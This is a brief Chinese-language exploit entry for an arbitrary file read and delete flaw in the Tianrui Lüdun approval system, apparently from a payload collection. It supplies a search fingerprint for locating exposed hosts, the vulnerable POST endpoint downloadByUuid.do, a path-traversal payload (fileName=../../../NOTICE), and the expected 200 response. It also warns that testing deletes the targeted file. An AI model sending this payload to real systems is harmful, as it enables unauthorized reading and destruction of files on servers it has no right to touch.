# 天锐绿盾审批系统downloadByUuid.do任意文件读取+删除漏洞

天锐绿盾 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="TIPPAY-绿盾审批系统"`
- **请求**：`POST /trwfe/file/downloadByUuid.do HTTP/1.1`

**Payload**
```
漏洞测试会删除对应文件，谨慎测试
Host:
Content-Type: application/x-www-form-urlencoded
fileName=../../../NOTICE&uuid=x
```
- **响应特征**：200